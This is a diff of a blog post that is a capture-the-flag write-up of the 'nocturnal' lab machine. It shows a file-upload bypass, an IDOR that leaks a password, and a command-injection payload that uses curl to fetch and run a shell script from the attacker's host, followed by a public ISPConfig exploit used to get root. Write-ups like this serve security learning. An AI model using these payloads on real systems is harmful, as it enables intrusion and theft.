@@ -1,3 +1,9 @@
+---
+layout: post
+title: "nocturnal"
+date: 2025-08-28 
+categories: ctf
+---
 # Attack Path
 
 First let’s enumerate:
@@ -42,7 +48,7 @@ The target has a web page, let’s go visit. Upon visiting, we need to add noctu
 
 Let’s also open burp.
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image.png)
 
 Visiting the page, we get a login or register page. Default credentials admin:admin failed and we also failed to register a new user. Let’s try to enumerate the sub directories.
 
@@ -61,7 +67,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt:FUZZ -u h
 
 Let’s try going to backups:
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%201.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%201.png)
 
 Viewing the page source, we also find these two .php pages:
 
@@ -70,7 +76,7 @@ login.php
 register.php
 ```
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%202.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%202.png)
 
 Turns the the machine was just bugged. We can register a new user and log in, which gives us the ability to upload files. 
 
@@ -94,13 +100,13 @@ Let’s try append the allowed extension at the back:
 webshell.php.pdf
 ```
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%203.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%203.png)
 
 It got uploaded.
 
 When we click in the file we uploaded, it downloads the file to our local device. This is the burp request:
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%204.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%204.png)
 
 This is a potential IDOR vulnerability, let’s see if we can fuzz the username and file parameter.
 
@@ -108,15 +114,15 @@ Let’s test it out.
 
 First let’s try if we can view wild card characters, and list all the files:
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%205.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%205.png)
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%206.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%206.png)
 
 We can. Let’s see if we can view other users’ file. When we first tried to register, we tried as admin, however, it failed, leading us to believe that the user is already registered. Let’s see if we can change the username to that:
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%207.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%207.png)
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%208.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%208.png)
 
 It seems to be working, but there are no files to download. We also check some of the other extensions but it did not amount to anything. Now let’s attempt to fuzz for usernames and find other users that might have files on the server.
 
@@ -143,7 +149,7 @@ It turns out, when we are trying the wildcard matching, the backend is not accep
 
 Now in the response, highlight the content, excluding the headers, then copy to file and save it
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%209.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%209.png)
 
 ```bash
 Dear Amanda,
@@ -163,11 +169,11 @@ arHkG7HAI68X8s1J
 
 Let’s try login as amanda with the password.
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%2010.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%2010.png)
 
 Let’s go to admin panel
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%2011.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%2011.png)
 
 We have the ability to create a backup zip file, after entering the password of amanda. Let’s read admin.php and see how the function actually works. 
 
@@ -225,7 +231,7 @@ And this custom table is helpful to see what other characters are could still be
 
 Looks like we can use newline character to start a new command, and tab character to replace space. Let’s test if it works. First, let’s capture the request that creates the zip file with burp intercept:
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%2012.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%2012.png)
 
 The command used is:
 
@@ -302,7 +308,7 @@ password=hello%0acurl%09-o%09/tmp/shell.sh%09http://10.10.16.2:8001/shell.sh%0ab
 
 We now have shell:
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%2013.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%2013.png)
 
 Navigating around, we find a db at nocturnal_database dir:
 
@@ -407,7 +413,7 @@ Let’s forward it to our [localhost](http://localhost) so we can have a better 
 ssh tobias@10.10.11.64 -L 8080:localhost:8080
 ```
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%2014.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%2014.png)
 
 Tried default credentials:
 
@@ -429,7 +435,7 @@ We are in.
 
 In the help tab, we find the version: ISPConfig Version: 3.2.10p1
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%2015.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%2015.png)
 
 A search on Google revealed exploit:
 
@@ -441,7 +447,7 @@ Let’s download the exploit and try it out.
 python3 exploit.py http://localhost:8080 admin slowmotionapocalypse
 ```
 
-![image.png](Attack%20Path%201d4068bbc57d80fe8c30e840fd3b6b4c/image%2016.png)
+![image.png]({{ site.baseurl }}/assets/nocturnal/image%2016.png)
 
 now we can get root flag
 
